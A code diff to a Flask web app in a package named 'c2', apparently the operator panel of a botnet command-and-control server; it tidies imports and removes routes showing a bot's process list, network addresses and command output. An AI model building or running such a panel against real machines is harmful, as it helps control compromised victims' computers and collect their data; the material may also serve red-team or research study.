@@ -5,10 +5,9 @@ from flask import request
 from flask import render_template
 from flask import redirect, url_for
 from flask import session
-
+import os
 from c2.database import get_bot_record as db
 from c2 import app
-import os
 
 
 def get_db() -> sql.Connection:
@@ -32,7 +31,6 @@ def index():
 
 @app.route('/favicon.ico')
 def favicon():
-
     return send_from_directory("static", 'favicon.ico', mimetype='image/svg+xml')
 
 
@@ -51,38 +49,6 @@ def bot(id):
         return redirect(url_for('login'))
     if request.method == 'GET':
         return render_template('bot.html', id = id)
-
-
-@app.route('/bot/<id>/proclist', methods=['GET'])
-def proclist(id):
-    if 'username' not in session:
-        return redirect(url_for('login'))
-    if request.method == 'GET':
-        conn = get_db()
-        return render_template('botproclist.html', id = id, bot_data = db.bot_pstostring(conn, id))
-
-
-@app.route('/bot/<id>/networkaddresses', methods=['GET'])
-def networkaddresses(id):
-    if 'username' not in session:
-        return redirect(url_for('login'))
-    if request.method == 'GET':
-        conn = get_db()
-        data = db.bot_nwaddrtostring(conn, id)
-        ips = []
-        for adapter in data:
-            if 'ip' in data[adapter]:
-                ips.append(data[adapter]['ip'])
-        return render_template('botnetworkaddresslist.html', id=id, bot_data=ips)
-
-
-@app.route('/bot/<id>/commandoutput', methods=['GET'])
-def commandoutput(id):
-    if 'username' not in session:
-        return redirect(url_for('login'))
-    if request.method == 'GET':
-        conn = get_db()
-        return render_template('botcommandout.html', id=id, bot_data=db.bot_cmdouttostring(conn, id))
 
 
 @app.route('/uploads', methods=['GET'])
@@ -113,7 +79,6 @@ def uploads(req_path):
             # Show directory contents
             files = os.listdir(abs_path)
             return render_template('uploads.html', files=files)
-
 
 
 @app.errorhandler(404)
